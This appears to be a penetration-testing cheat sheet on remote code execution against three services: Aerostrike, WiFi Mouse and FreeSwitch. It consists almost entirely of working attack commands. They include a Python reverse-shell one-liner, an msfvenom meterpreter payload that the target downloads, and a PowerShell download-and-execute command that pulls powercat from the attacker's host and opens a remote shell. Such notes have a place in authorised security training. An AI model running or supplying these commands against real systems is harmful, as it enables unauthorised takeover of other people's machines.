# 03 - Service Exploitation

Index
- [Example: reverse shell](#Example-reverse-shell)
    - [ID 49067 RCE and Reverse Shell: Aerostrike](#ID-49067-RCE-Aerostrike)
    - [ID 49601 RCE and Reverse Shell: WiFi Mouse](#ID-49601-RCE-WiFi-Mouse)
    - [ID 47799 RCE and Reverse Shell: FreeSwitch](#ID-47799-RCE-FreeSwitch)

## Example: reverse shell
### ID 49067 RCE Aerostrike
Aerostrike RCE:
``` bash
python 49067.py --ahost 192.168.1.1 -aport 3000 --cmd "id"
```
Python Reverse Shell example:
``` bash
## require nc listener: nc -nvlp 443
python 49067.py --ahost 192.168.1.1 --cmd "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$KALI\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
```

### ID 49601 RCE WiFi Mouse
WiFi Mouse Reverse Shell - tcp\1978 (???):
``` bash
## create a payload
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$KALI LPORT=443 -f exe > payload.exe
## require multi/handler and HTTP server (port 8080 in my example) to download the payload
python2.7 49601.py 192.168.1.1 $KALI:8080 met.exe
```

### ID 47799 RCE FreeSwitch
Service available via TCP port (ex: 8021)
``` bash
## windows reverse shell
python3 47799.txt 192.168.1.1 "powershell IEX(New-Object System.Net.WebClient).DownloadString('http://$KALI/powercat.ps1');powercat -c $KALI -p 443 -e powershell"
```
